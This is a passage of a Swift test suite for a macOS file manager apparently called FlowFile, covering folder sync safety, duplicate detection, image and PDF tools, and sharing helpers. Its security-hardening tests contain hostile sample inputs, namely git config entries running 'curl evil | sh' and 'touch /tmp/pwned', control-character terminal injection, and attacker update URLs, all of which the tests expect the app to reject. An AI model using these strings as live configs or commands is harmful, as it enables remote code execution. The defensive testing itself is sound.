            try expect(trashKeepingNewest == [f2.standardizedFileURL], "Older copy must be selected when keeping newest")

            let trashKeepingOldest = DuplicateFinderService.urlsToTrashKeepingOldest(in: dupGroups)
            try expect(trashKeepingOldest == [f2Dup.standardizedFileURL], "Newer copy must be selected when keeping oldest")
        }
    }

    // MARK: - 16: Folder Synchronization & Quick File Tools (Image Convert, Merge PDF, SHA-256)

    static func folderSyncAndQuickFileTools() async throws {
        try await withTempDir { tempDir in
            let leftDir = tempDir.appendingPathComponent("SyncLeft", isDirectory: true)
            let rightDir = tempDir.appendingPathComponent("SyncRight", isDirectory: true)
            try FileManager.default.createDirectory(at: leftDir, withIntermediateDirectories: true)
            try FileManager.default.createDirectory(at: rightDir, withIntermediateDirectories: true)

            // Safety checks: sameFolder & nestedFolders
            try expectThrows("Same folder sync must throw") {
                _ = try FolderSyncService.buildPlanSync(leftRoot: leftDir, rightRoot: leftDir, mode: .updateLeftToRight)
            }
            let nested = leftDir.appendingPathComponent("Sub", isDirectory: true)
            try FileManager.default.createDirectory(at: nested, withIntermediateDirectories: true)
            try expectThrows("Nested folder sync must throw") {
                _ = try FolderSyncService.buildPlanSync(leftRoot: leftDir, rightRoot: nested, mode: .updateLeftToRight)
            }

            let leftOnly = nested.appendingPathComponent("only_left.txt")
            let rightOnly = rightDir.appendingPathComponent("only_right.txt")
            try Data("L".utf8).write(to: leftOnly)
            try Data("R".utf8).write(to: rightOnly)

            // Two-way sync copies in both directions
            let twoWayPlan = try FolderSyncService.buildPlanSync(leftRoot: leftDir, rightRoot: rightDir, mode: .twoWayNewest)
            try expect(twoWayPlan.count == 2)
            let executed = try FolderSyncService.execute(plan: twoWayPlan)
            try expect(executed == 2)
            try expect(FileManager.default.fileExists(atPath: rightDir.appendingPathComponent("Sub/only_left.txt").path))
            try expect(FileManager.default.fileExists(atPath: leftDir.appendingPathComponent("only_right.txt").path))

            // Mirror mode removes extra file in right (using isolated fake Trash so tests never touch ~/.Trash)
            let fakeTrash = tempDir.appendingPathComponent("FakeTrash", isDirectory: true)
            try FileManager.default.createDirectory(at: fakeTrash, withIntermediateDirectories: true)
            let extraInRight = rightDir.appendingPathComponent("stale_extra.txt")
            try Data("stale".utf8).write(to: extraInRight)
            let mirrorPlan = try FolderSyncService.buildPlanSync(leftRoot: leftDir, rightRoot: rightDir, mode: .mirrorLeftToRight)
            try expect(mirrorPlan.count == 1 && mirrorPlan[0].operation == .trashInRight)
            _ = try FolderSyncService.execute(plan: mirrorPlan) { url in
                try FileManager.default.moveItem(at: url, to: fakeTrash.appendingPathComponent(url.lastPathComponent))
            }
            try expect(!FileManager.default.fileExists(atPath: extraInRight.path))
            try expect(FileManager.default.fileExists(atPath: fakeTrash.appendingPathComponent("stale_extra.txt").path))

            // QuickFileToolsService: Generate a 400x300 PNG, convert/resize to JPEG, merge 2 images to PDF, and verify SHA-256
            let toolsDir = tempDir.appendingPathComponent("QuickTools", isDirectory: true)
            try FileManager.default.createDirectory(at: toolsDir, withIntermediateDirectories: true)

            let samplePNG1 = toolsDir.appendingPathComponent("photo1.png")
            let samplePNG2 = toolsDir.appendingPathComponent("photo2.png")
            try writeSolidTestPNG(to: samplePNG1, width: 400, height: 300, color: .systemBlue)
            try writeSolidTestPNG(to: samplePNG2, width: 400, height: 300, color: .systemGreen)

            let convertedJPGs = try QuickFileToolsService.convertImages(
                urls: [samplePNG1],
                inDirectory: toolsDir,
                format: .jpeg,
                jpegQuality: 0.85,
                resizePreset: .original
            )
            try expect(convertedJPGs.count == 1)
            try expect(convertedJPGs[0].pathExtension == "jpg")
            try expect(FileManager.default.fileExists(atPath: convertedJPGs[0].path))

            let mergedPDF = try QuickFileToolsService.mergeIntoPDF(
                urls: [samplePNG1, samplePNG2],
                inDirectory: toolsDir,
                preferredBaseName: "SamletTest"
            )
            try expect(FileManager.default.fileExists(atPath: mergedPDF.path))
            let loadedPDF = PDFDocument(url: mergedPDF)
            try expect(loadedPDF?.pageCount == 2, "Merged PDF from 2 images must contain 2 pages")

            // Streaming SHA-256 verification against CryptoKit in-memory digest
            let hashTarget = toolsDir.appendingPathComponent("checksum.bin")
            let payload = Data("FlowFile v1.1 SHA-256 Test".utf8)
            try payload.write(to: hashTarget)
            let expectedHex = SHA256.hash(data: payload).map { String(format: "%02x", $0) }.joined()
            let actualHex = try await QuickFileToolsService.computeSHA256(for: hashTarget)
            try expect(actualHex == expectedHex)
        }
    }

    private static func writeSolidTestPNG(to url: URL, width: Int, height: Int, color: NSColor) throws {
        guard let rep = NSBitmapImageRep(
            bitmapDataPlanes: nil,
            pixelsWide: width,
            pixelsHigh: height,
            bitsPerSample: 8,
            samplesPerPixel: 4,
            hasAlpha: true,
            isPlanar: false,
            colorSpaceName: .deviceRGB,
            bytesPerRow: 0,
            bitsPerPixel: 0
        ) else {
            throw TestAssertionError(description: "Failed to allocate bitmap")
        }
        NSGraphicsContext.saveGraphicsState()
        NSGraphicsContext.current = NSGraphicsContext(bitmapImageRep: rep)
        color.setFill()
        NSBezierPath.fill(NSRect(x: 0, y: 0, width: width, height: height))
        NSGraphicsContext.restoreGraphicsState()

        guard let pngData = rep.representation(using: .png, properties: [:]) else {
            throw TestAssertionError(description: "Failed to encode PNG")
        }
        try pngData.write(to: url)
    }

    static func runAll() async throws {
        try await multiRenameUppercaseAndCaseOnly()
        try await batchRenameRollbackOnMidBatchFailure()
        try await singleItemCaseOnlyRename()
        try await updateVerificationFailsClosed()
        try releaseNotesCleaningAndPayloadParsing()
        try await atomicBundleInstallReplacesCleanly()
        try await archiveSecurityAndWildcards()
        try await folderNamedLikeArchive()
        try wifiShareSecurity()
        try await wifiShareRestartCancellationSafety()
        try await gitRepoRootLookup()
        try utf8ChunkDecoderSplitBoundaries()
        try await defaultFileBrowserAndSmartTabRouting()
        try await colorTagsAndWorkspaceSessionPersistence()
        try await deepSearchFlatViewDiskSpaceAndDuplicates()
        try await folderSyncAndQuickFileTools()
        try await safetyAndSecurityHardening()
        try await sharingRedesignAndWiFiServer()
    }

    // MARK: - 17: v1.1.1 Data-safety & security hardening

    static func safetyAndSecurityHardening() async throws {
        try await withTempDir { tempDir in
            let fm = FileManager.default

            // C1: Mirror mode must refuse when the left folder can't be read (never plan "trash everything")
            let right = tempDir.appendingPathComponent("Backup", isDirectory: true)
            try fm.createDirectory(at: right, withIntermediateDirectories: true)
            try Data("viktig".utf8).write(to: right.appendingPathComponent("viktig.txt"))
            let missingLeft = tempDir.appendingPathComponent("FrakobletDisk", isDirectory: true)
            try expectThrows("Unreadable left must abort mirror planning") {
                _ = try FolderSyncService.buildPlanSync(leftRoot: missingLeft, rightRoot: right, mode: .mirrorLeftToRight)
            }

            // C1: Empty left in mirror mode must refuse too
            let emptyLeft = tempDir.appendingPathComponent("TomKilde", isDirectory: true)
            try fm.createDirectory(at: emptyLeft, withIntermediateDirectories: true)
            try expectThrows("Empty left must abort mirror planning") {
                _ = try FolderSyncService.buildPlanSync(leftRoot: emptyLeft, rightRoot: right, mode: .mirrorLeftToRight)
            }
            // ...but non-destructive update mode with an empty left is fine
            let emptyPlan = try FolderSyncService.buildPlanSync(leftRoot: emptyLeft, rightRoot: right, mode: .updateLeftToRight)
            try expect(emptyPlan.isEmpty)

            // C1: Unreadable subfolder inside left aborts the plan
            let leftWithLockedSub = tempDir.appendingPathComponent("KildeMedLåst", isDirectory: true)
            let lockedSub = leftWithLockedSub.appendingPathComponent("Låst", isDirectory: true)
            try fm.createDirectory(at: lockedSub, withIntermediateDirectories: true)
            try Data("a".utf8).write(to: leftWithLockedSub.appendingPathComponent("a.txt"))
            try fm.setAttributes([.posixPermissions: 0o000], ofItemAtPath: lockedSub.path)
            defer { try? fm.setAttributes([.posixPermissions: 0o755], ofItemAtPath: lockedSub.path) }
            if !fm.isReadableFile(atPath: lockedSub.path) {
                try expectThrows("Unreadable subfolder must abort planning") {
                    _ = try FolderSyncService.buildPlanSync(leftRoot: leftWithLockedSub, rightRoot: right, mode: .mirrorLeftToRight)
                }
            }
            try fm.setAttributes([.posixPermissions: 0o755], ofItemAtPath: lockedSub.path)

            // H8: Nested detection is case-insensitive and symlink-aware
            let nestedViaCase = URL(fileURLWithPath: right.path.replacingOccurrences(of: "/Backup", with: "/backup"))
                .appendingPathComponent("Sub", isDirectory: true)
            try fm.createDirectory(at: right.appendingPathComponent("Sub"), withIntermediateDirectories: true)
            try expect(FolderSyncService.isSameOrInside(nestedViaCase, right))
            let linkToRight = tempDir.appendingPathComponent("LenkeTilBackup")
            try fm.createSymbolicLink(at: linkToRight, withDestinationURL: right)
            try expectThrows("Symlinked same folder must be rejected") {
                _ = try FolderSyncService.buildPlanSync(leftRoot: linkToRight, rightRoot: right, mode: .updateLeftToRight)
            }

            // C2: When Trash is unavailable (e.g. exFAT USB/SMB), sync must refuse rather than delete permanently
            let srcDir = tempDir.appendingPathComponent("Src", isDirectory: true)
            let dstDir = tempDir.appendingPathComponent("Dst", isDirectory: true)
            let fakeTrash = tempDir.appendingPathComponent("SyncTrash", isDirectory: true)
            try fm.createDirectory(at: srcDir, withIntermediateDirectories: true)
            try fm.createDirectory(at: dstDir, withIntermediateDirectories: true)
            try fm.createDirectory(at: fakeTrash, withIntermediateDirectories: true)
            let dstFile = dstDir.appendingPathComponent("doc.txt")
            try Data("gammel".utf8).write(to: dstFile)
            try fm.setAttributes([.modificationDate: Date(timeIntervalSinceNow: -7200)], ofItemAtPath: dstFile.path)
            try Data("ny versjon".utf8).write(to: srcDir.appendingPathComponent("doc.txt"))
            let overwritePlan = try FolderSyncService.buildPlanSync(leftRoot: srcDir, rightRoot: dstDir, mode: .updateLeftToRight)
            try expect(overwritePlan.count == 1)
            try expectThrows("Unavailable Trash must abort without permanent deletion") {
                _ = try FolderSyncService.execute(plan: overwritePlan) { _ in
                    throw NSError(domain: NSCocoaErrorDomain, code: NSFeatureUnsupportedError)
                }
            }
            try expect(String(data: try Data(contentsOf: dstFile), encoding: .utf8) == "gammel", "Original file must survive when Trash fails")
            let leftoversAfterFail = try fm.contentsOfDirectory(atPath: dstDir.path).filter { $0.hasPrefix(".flowfile-sync-") }
            try expect(leftoversAfterFail.isEmpty, "Temp sibling must be cleaned up on failure")

            // H9: Overwrite keeps a working file (temp copy + atomic move), old version goes to Trash
            _ = try FolderSyncService.execute(plan: overwritePlan) { url in
                try fm.moveItem(at: url, to: fakeTrash.appendingPathComponent(url.lastPathComponent))
            }
            try expect(String(data: try Data(contentsOf: dstFile), encoding: .utf8) == "ny versjon")
            try expect(fm.fileExists(atPath: fakeTrash.appendingPathComponent("doc.txt").path))
            let leftovers = try fm.contentsOfDirectory(atPath: dstDir.path).filter { $0.hasPrefix(".flowfile-sync-") }
            try expect(leftovers.isEmpty, "No temp files may be left behind")

            // C3: The same physical file reached via two roots (symlink) is never its own duplicate
            let photos = tempDir.appendingPathComponent("Bilder", isDirectory: true)
            try fm.createDirectory(at: photos, withIntermediateDirectories: true)
            try Data(repeating: 0x5A, count: 5000).write(to: photos.appendingPathComponent("eneste.jpg"))
            let photosAlias = tempDir.appendingPathComponent("BilderLenke")
            try fm.createSymbolicLink(at: photosAlias, withDestinationURL: photos)
            let selfDupGroups = DuplicateFinderService.scanSync(inRoots: [photos, photosAlias])
            try expect(selfDupGroups.isEmpty, "A single file reached via two paths must not be reported as duplicate")
            // Hardlinks are the same data and must not be offered for deletion either
            try fm.linkItem(at: photos.appendingPathComponent("eneste.jpg"), to: photos.appendingPathComponent("hardlink.jpg"))
            try expect(DuplicateFinderService.scanSync(inRoots: [photos]).isEmpty)

            // H7: Disk analyzer protects home and system folders
            let home = fm.homeDirectoryForCurrentUser
            try expect(DiskSpaceSheetView.isProtected(home))
            try expect(DiskSpaceSheetView.isProtected(home.appendingPathComponent("Documents")))
            try expect(DiskSpaceSheetView.isProtected(URL(fileURLWithPath: "/System")))
            try expect(!DiskSpaceSheetView.isProtected(photos))

            // S1: Untrusted git config detection
            try expect(GitStatusService.isGitConfigTextSafe("[core]\n\trepositoryformatversion = 0\n\tbare = false\n[remote \"origin\"]\n\turl = https://example.com/x.git\n"))
            try expect(!GitStatusService.isGitConfigTextSafe("[core]\n\tfsmonitor = \"sh -c 'curl evil | sh'\"\n"))
            try expect(!GitStatusService.isGitConfigTextSafe("[core] fsmonitor=/tmp/x\n"))
            try expect(!GitStatusService.isGitConfigTextSafe("[filter \"lfs\"]\n\tclean = evil %f\n"))
            try expect(!GitStatusService.isGitConfigTextSafe("[include]\n\tpath = /tmp/evil.cfg\n"))
            try expect(!GitStatusService.isGitConfigTextSafe("[includeIf \"gitdir:~/\"]\n\tpath = x\n"))
            try expect(!GitStatusService.isGitConfigTextSafe("[diff \"img\"]\n\ttextconv = evil\n"))
            try expect(!GitStatusService.isGitConfigTextSafe("[core]\n\tsshCommand = evil\n"))
            let evilRepo = tempDir.appendingPathComponent("evilrepo", isDirectory: true)
            try fm.createDirectory(at: evilRepo.appendingPathComponent(".git"), withIntermediateDirectories: true)
            try Data("[core]\n\tfsmonitor = touch /tmp/pwned\n".utf8).write(to: evilRepo.appendingPathComponent(".git/config"))
            try expect(!GitStatusService.isRepositoryConfigSafe(repoRoot: evilRepo))
            let env = GitStatusService.hardenedGitEnvironment()
            try expect(env["GIT_CONFIG_NOSYSTEM"] == "1" && env["GIT_CONFIG_GLOBAL"] == "/dev/null")

            // S5: Terminal auto-cd refuses control characters
            try expect(TerminalSession.isSafeToTypeIntoTerminal("/tmp/Prosjekt æøå (2026)"))
            try expect(!TerminalSession.isSafeToTypeIntoTerminal("/tmp/a\u{15}curl evil|sh\n"))
            try expect(!TerminalSession.isSafeToTypeIntoTerminal("/tmp/a\u{1B}[31m"))
            try expect(!TerminalSession.isSafeToTypeIntoTerminal("/tmp/a\u{85}b"))

            // S3: Quarantine is propagated from archive to extracted content
            let fakeArchive = tempDir.appendingPathComponent("lastet-ned.zip")
            try Data("PK".utf8).write(to: fakeArchive)
            let qValue = "0081;\(String(Int(Date().timeIntervalSince1970), radix: 16));Safari;"
            _ = qValue.withCString { ptr in
                setxattr(fakeArchive.path, QuarantineService.attributeName, ptr, strlen(ptr), 0, 0)
            }
            let extractedDir = tempDir.appendingPathComponent("utpakket", isDirectory: true)
            try fm.createDirectory(at: extractedDir.appendingPathComponent("Inner.app/Contents"), withIntermediateDirectories: true)
            let script = extractedDir.appendingPathComponent("installer.command")
            try Data("#!/bin/sh\necho hi\n".utf8).write(to: script)
            if QuarantineService.isQuarantined(fakeArchive) {
                QuarantineService.propagate(from: fakeArchive, to: [extractedDir])
                try expect(QuarantineService.isQuarantined(extractedDir))
                try expect(QuarantineService.isQuarantined(script))
                try expect(QuarantineService.isQuarantined(extractedDir.appendingPathComponent("Inner.app/Contents")))
            }
            try expect(QuarantineService.isPotentiallyExecutable(script))
            try expect(QuarantineService.isPotentiallyExecutable(extractedDir.appendingPathComponent("Inner.app")))
            try expect(!QuarantineService.isPotentiallyExecutable(photos.appendingPathComponent("eneste.jpg")))

            // S6: Update source pinned to GitHub slugs and GitHub-hosted assets
            try expect(UpdateService.isValidRepoSlug("nordiccraft/FlowFile"))
            try expect(!UpdateService.isValidRepoSlug("https://evil.example/rel.json"))
            try expect(!UpdateService.isValidRepoSlug("a/b/c"))
            try expect(UpdateService.isTrustedAssetURL(URL(string: "https://github.com/nordiccraft/FlowFile/releases/download/v1.1.1/FlowFile-Update.zip")!))
            try expect(!UpdateService.isTrustedAssetURL(URL(string: "https://evil.example/FlowFile-Update.zip")!))
            try expect(!UpdateService.isTrustedAssetURL(URL(string: "http://github.com/x.zip")!))
            let payload: [String: Any] = [
                "tag_name": "v9.9.9",
                "assets": [
                    ["name": "Evil.zip", "browser_download_url": "https://evil.example/Evil.zip"],
                    ["name": "FlowFile-Update.zip", "browser_download_url": "https://github.com/nordiccraft/FlowFile/releases/download/v9.9.9/FlowFile-Update.zip"]
                ]
            ]
            let parsed = try UpdateService.parseReleasePayload(data: try JSONSerialization.data(withJSONObject: payload))
            try expect(parsed.zipDownloadURL?.host == "github.com")
            try expect(UpdateService.updateLogURL.path.contains("/Library/Logs/FlowFile/"))
        }
    }

    // MARK: - 18: v1.2.0 Sharing Redesign (UTF-8 Zip, Lossless GPS Strip, Cloud Isolation, LAN Range/PIN)

    static func sharingRedesignAndWiFiServer() async throws {
        try await withTempDir { tempDir in
            let fm = FileManager.default

            // 1. Folder share -> UTF-8 ZIP excludes .env/symlinks and sets bit 11 (0x0800) for Windows compatibility
            let secretOutside = tempDir.appendingPathComponent("hemmelig_nøkkel.txt")
            try Data("PRIVATE_KEY".utf8).write(to: secretOutside)

            let shareFolder = tempDir.appendingPathComponent("Prosjekt_æøå", isDirectory: true)
            try fm.createDirectory(at: shareFolder, withIntermediateDirectories: true)
            try Data("hei".utf8).write(to: shareFolder.appendingPathComponent("Rapport_æøå.txt"))
            try Data("SECRET=123".utf8).write(to: shareFolder.appendingPathComponent(".env"))
            try fm.createSymbolicLink(
                at: shareFolder.appendingPathComponent("lekkasje.txt"),
                withDestinationURL: secretOutside
            )

            // Create a JPEG with real GPS metadata + an unstrip-able .mov file inside the folder
            let photoURL = shareFolder.appendingPathComponent("feriebilde.jpg")
            try writeTestJPEGWithGPS(to: photoURL)
            try Data("fake video".utf8).write(to: shareFolder.appendingPathComponent("klipp.mov"))

            let folderItem = FileItem(url: shareFolder, resourceValues: try shareFolder.resourceValues(forKeys: [.isDirectoryKey, .isPackageKey]))
            var opts = SharePreparationOptions()
            opts.packageAsCleanZip = true
            opts.archiveBaseName = "Leveranse_æøå"
            opts.convertHeicAndStripGPS = true

            let payload = try ShareHubService.preparePayload([folderItem], options: opts)
            defer {
                if let root = payload.stagingRoot { try? fm.removeItem(at: root) }
            }
            try expect(payload.urls.count == 1)
            try expect(payload.excludedHiddenCount >= 1, ".env must be excluded")
            try expect(payload.skippedSymlinksCount == 1, "External symlink must be skipped")
            try expect(payload.cleanedImagesCount == 1, "JPEG inside folder must be stripped of GPS")
            try expect(payload.uncleanedFiles.contains("klipp.mov"), "Uncleaned video must be reported")

            // Verify ZIP UTF-8 flag bit 11 (0x0800) is set in the generated zip
            let zipData = try Data(contentsOf: payload.urls[0])
            let lfhSig = Data([0x50, 0x4B, 0x03, 0x04])
            var foundUTF8Entry = false
            var searchStart = 0
            while let r = zipData.range(of: lfhSig, in: searchStart..<zipData.count) {
                let offset = r.lowerBound
                if offset + 30 <= zipData.count {
                    let flags = UInt16(zipData[offset + 6]) | (UInt16(zipData[offset + 7]) << 8)
                    let nameLen = Int(UInt16(zipData[offset + 26]) | (UInt16(zipData[offset + 27]) << 8))
                    if offset + 30 + nameLen <= zipData.count {
                        let nameBytes = zipData[(offset + 30)..<(offset + 30 + nameLen)]
                        if nameBytes.contains(where: { $0 >= 0x80 }) {
                            try expect((flags & 0x0800) != 0, "Non-ASCII ZIP entry must have UTF-8 flag bit 11 set")
                            foundUTF8Entry = true
                        }
                    }
                }
                searchStart = offset + 4
            }
            try expect(foundUTF8Entry, "Expected at least one non-ASCII entry in UTF-8 zip")

            // Verify lossless JPEG GPS stripping removed GPS dictionary completely
            let strippedDir = tempDir.appendingPathComponent("Stripped", isDirectory: true)
            try fm.createDirectory(at: strippedDir, withIntermediateDirectories: true)
            let strippedJPG = ShareHubService.sanitizeAndConvertImageIfApplicable(sourceURL: photoURL, into: strippedDir)
            try expect(strippedJPG != nil)
            if let strippedJPG, let src = CGImageSourceCreateWithURL(strippedJPG as CFURL, nil),
               let props = CGImageSourceCopyPropertiesAtIndex(src, 0, nil) as? [CFString: Any] {
                try expect(props[kCGImagePropertyGPSDictionary] == nil, "GPS metadata must be stripped")
            }

            // 2. Cloud detection via symlink + Google Drive writable root + isolated per-share folder
            let fakeCloudRoot = tempDir.appendingPathComponent("CloudStorage/OneDrive-Contoso", isDirectory: true)
            let fakeCloudLink = tempDir.appendingPathComponent("OneDriveLink")
            try fm.createDirectory(at: fakeCloudRoot, withIntermediateDirectories: true)
            try fm.createSymbolicLink(at: fakeCloudLink, withDestinationURL: fakeCloudRoot)
            let workAccount = CloudAccountItem(provider: .oneDrive, displayName: "OneDrive", subtitle: "Contoso AS", rootURL: fakeCloudRoot)
            try expect(workAccount.fullDisplayName == "OneDrive – Contoso AS")
            let viaSymlinkFile = fakeCloudLink.appendingPathComponent("rapport.docx")
            try expect(CloudStorageService.cloudAccount(containing: viaSymlinkFile, accounts: [workAccount])?.id == workAccount.id)

            let fakeGDrive = tempDir.appendingPathComponent("CloudStorage/GoogleDrive-user", isDirectory: true)
            let minDisk = fakeGDrive.appendingPathComponent("Min disk", isDirectory: true)
            try fm.createDirectory(at: minDisk, withIntermediateDirectories: true)
            let gAccount = CloudAccountItem(provider: .googleDrive, displayName: "Google Drive", subtitle: "user@example.com", rootURL: fakeGDrive)
            try expect(CloudStorageService.writableUploadRootURL(for: gAccount).standardizedFileURL == minDisk.standardizedFileURL)

            let uploadResult = try ShareHubService.copyIntoCloudSharedFolder([secretOutside], account: gAccount, shareLabel: "Budsjett")
            try expect(uploadResult.folder.path.hasPrefix(minDisk.path), "Google Drive upload must land inside Min disk")
            try expect(uploadResult.folder.lastPathComponent.contains("Budsjett"), "Per-share isolated subfolder must be created")

            // 3. LAN/QR helpers: Byte Range parsing, PIN, constant-time compare & NFC Content-Disposition
            try expect(LocalWiFiShareServer.parseByteRange("bytes=0-99", totalSize: 1000) == 0...99)
            try expect(LocalWiFiShareServer.parseByteRange("bytes=500-", totalSize: 1000) == 500...999)
            try expect(LocalWiFiShareServer.parseByteRange("bytes=-200", totalSize: 1000) == 800...999)
            try expect(LocalWiFiShareServer.parseByteRange("bytes=2000-3000", totalSize: 1000) == nil)
            try expect(LocalWiFiShareServer.parseByteRange("bytes=0-10, 20-30", totalSize: 1000) == nil)
            try expect(LocalWiFiShareServer.constantTimeEquals("abc123", "abc123"))
            try expect(!LocalWiFiShareServer.constantTimeEquals("abc123", "abc124"))
            let pin = LocalWiFiShareServer.generateFourDigitPIN()
            try expect(pin.count == 4 && pin.allSatisfy(\.isNumber))
            let cd = LocalWiFiShareServer.contentDispositionHeaderValue(for: "Rapport_æøå.txt")
            try expect(cd.contains("filename=\"Rapport_aeoa.txt\""))
            try expect(cd.contains("filename*=UTF-8''"))
        }
    }

    private static func writeTestJPEGWithGPS(to url: URL) throws {
        let colorSpace = CGColorSpaceCreateDeviceRGB()
        guard let ctx = CGContext(
            data: nil, width: 32, height: 32, bitsPerComponent: 8, bytesPerRow: 0,
            space: colorSpace, bitmapInfo: CGImageAlphaInfo.noneSkipLast.rawValue
        ) else {
            throw TestAssertionError(description: "Failed to create CGContext")
        }
        ctx.setFillColor(NSColor.systemBlue.cgColor)
        ctx.fill(CGRect(x: 0, y: 0, width: 32, height: 32))
        guard let cgImg = ctx.makeImage(),
              let dest = CGImageDestinationCreateWithURL(url as CFURL, UTType.jpeg.identifier as CFString, 1, nil) else {
            throw TestAssertionError(description: "Failed to create JPEG destination")
        }
        let gpsProps: [CFString: Any] = [
            kCGImagePropertyGPSDictionary: [
                kCGImagePropertyGPSLatitude: 59.9139,
                kCGImagePropertyGPSLatitudeRef: "N",
                kCGImagePropertyGPSLongitude: 10.7522,
                kCGImagePropertyGPSLongitudeRef: "E"
            ]
        ]
        CGImageDestinationAddImage(dest, cgImg, gpsProps as CFDictionary)
        guard CGImageDestinationFinalize(dest) else {
            throw TestAssertionError(description: "Failed to finalize test JPEG")
        }
    }
}

#if canImport(XCTest)
final class FlowFileTests: XCTestCase {
    func testMultiRenameUppercaseAndCaseOnly() async throws {
        try await FlowFileVerificationSuite.multiRenameUppercaseAndCaseOnly()
    }

    func testBatchRenameRollbackOnMidBatchFailure() async throws {
        try await FlowFileVerificationSuite.batchRenameRollbackOnMidBatchFailure()
    }

    func testSingleItemCaseOnlyRename() async throws {
        try await FlowFileVerificationSuite.singleItemCaseOnlyRename()
    }

    func testUpdateVerificationFailsClosed() async throws {
        try await FlowFileVerificationSuite.updateVerificationFailsClosed()
    }

    func testReleaseNotesCleaningAndPayloadParsing() throws {
        try FlowFileVerificationSuite.releaseNotesCleaningAndPayloadParsing()
    }

    func testAtomicBundleInstallReplacesCleanly() async throws {
        try await FlowFileVerificationSuite.atomicBundleInstallReplacesCleanly()
    }

    func testArchiveSecurityAndWildcards() async throws {
        try await FlowFileVerificationSuite.archiveSecurityAndWildcards()
    }

    func testFolderNamedLikeArchive() async throws {
        try await FlowFileVerificationSuite.folderNamedLikeArchive()
    }

    func testWiFiShareSecurity() throws {
        try FlowFileVerificationSuite.wifiShareSecurity()
    }

    @MainActor
    func testWiFiShareRestartCancellationSafety() async throws {
        try await FlowFileVerificationSuite.wifiShareRestartCancellationSafety()
    }

    func testGitRepoRootLookup() async throws {
        try await FlowFileVerificationSuite.gitRepoRootLookup()
    }

    func testUTF8ChunkDecoderSplitBoundaries() throws {
        try FlowFileVerificationSuite.utf8ChunkDecoderSplitBoundaries()
    }

    @MainActor
    func testDefaultFileBrowserAndSmartTabRouting() async throws {
        try await FlowFileVerificationSuite.defaultFileBrowserAndSmartTabRouting()
    }

    func testColorTagsAndWorkspaceSessionPersistence() async throws {
        try await FlowFileVerificationSuite.colorTagsAndWorkspaceSessionPersistence()
    }

    func testDeepSearchFlatViewDiskSpaceAndDuplicates() async throws {
        try await FlowFileVerificationSuite.deepSearchFlatViewDiskSpaceAndDuplicates()
    }

    func testFolderSyncAndQuickFileTools() async throws {
        try await FlowFileVerificationSuite.folderSyncAndQuickFileTools()
    }

    func testSafetyAndSecurityHardening() async throws {
        try await FlowFileVerificationSuite.safetyAndSecurityHardening()
    }

    func testSharingRedesignAndWiFiServer() async throws {
        try await FlowFileVerificationSuite.sharingRedesignAndWiFiServer()
    }
}
#else
@main
struct LocalCLTTestRunner {
    static func main() async throws {
        try await FlowFileVerificationSuite.runAll()
        print("ALL 18 FLOWFILE TEST SUITES PASSED")
    }
}
#endif
